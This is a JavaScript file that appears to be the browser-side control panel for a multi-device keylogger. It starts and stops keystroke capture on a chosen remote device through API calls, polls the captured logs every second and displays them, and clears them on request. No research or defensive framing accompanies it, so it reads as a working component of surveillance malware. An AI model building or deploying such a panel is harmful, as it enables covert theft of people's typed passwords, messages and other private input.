let logsInterval = null;
let currentDeviceId = null;

function updateLogs() {
    const output = document.getElementById('keylogger-output');
    if (!output || !currentDeviceId) {
        console.error('keylogger-output element not found or no device selected!');
        return;
    }

    fetch('/api/logs?device=' + currentDeviceId)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            if (data.error) {
                throw new Error(data.error);
            }
            // Join the array of logs with newlines
            output.textContent = data.logs.join('\n') || 'No content available';
        })
        .catch(error => {
            console.error('Error:', error);
            output.textContent = 'Error loading logs: ' + error.message;
            output.style.color = 'red';
        });
}

function controlKeylogger(action, deviceId) {
    if (!deviceId) {
        console.error('No device ID provided');
        return;
    }

    fetch(`/api/keylogger/${deviceId}/${action}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        }
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        console.log(`${action} response:`, data);
        
        if (action === 'start') {
            currentDeviceId = deviceId;
            // Start polling when logging starts
            logsInterval = setInterval(updateLogs, 1000);
            
            // Update UI to show logging state
            document.getElementById('start-logger').disabled = true;
            document.getElementById('stop-logger').disabled = false;
        } else if (action === 'stop') {
            // Stop polling when logging stops
            if (logsInterval) {
                clearInterval(logsInterval);
                logsInterval = null;
            }
            currentDeviceId = null;
            
            // Update UI to show stopped state
            document.getElementById('start-logger').disabled = false;
            document.getElementById('stop-logger').disabled = true;
        }
        
        updateLogs(); // Immediate update after action
    })
    .catch(error => {
        console.error(`Error during ${action}:`, error);
        const output = document.getElementById('keylogger-output');
        if (output) {
            output.textContent = `Error: ${error.message}`;
            output.style.color = 'red';
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const startLogger = document.getElementById('start-logger');
    const stopLogger = document.getElementById('stop-logger');
    const viewLogs = document.getElementById('view-logs');
    const clearLogs = document.getElementById('clear-logs');

    if (startLogger) {
        startLogger.addEventListener('click', () => {
            const deviceId = sessionStorage.getItem('currentDeviceId');
            if (!deviceId) {
                alert('Please select a device first');
                return;
            }
            controlKeylogger('start', deviceId);
        });
    }

    if (stopLogger) {
        stopLogger.addEventListener('click', () => {
            const deviceId = sessionStorage.getItem('currentDeviceId');
            if (!deviceId) {
                alert('No active device');
                return;
            }
            controlKeylogger('stop', deviceId);
        });
    }

    if (viewLogs) {
        viewLogs.addEventListener('click', () => {
            const deviceId = sessionStorage.getItem('currentDeviceId');
            if (!deviceId) {
                alert('Please select a device first');
                return;
            }
            currentDeviceId = deviceId;
            updateLogs();
        });
    }

    if (clearLogs) {
        clearLogs.addEventListener('click', () => {
            fetch('/api/keylogger/clear', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log('Clear response:', data);
                updateLogs();
            })
            .catch(error => console.error('Error clearing logs:', error));
        });
    }

    // Initial logs update if there's a selected device
    const deviceId = sessionStorage.getItem('currentDeviceId');
    if (deviceId) {
        currentDeviceId = deviceId;
        updateLogs();
    }
});

// Add event listener for device selection
document.addEventListener('deviceSelected', (event) => {
    currentDeviceId = event.detail.deviceId;
    sessionStorage.setItem('currentDeviceId', currentDeviceId);
    updateLogs();
});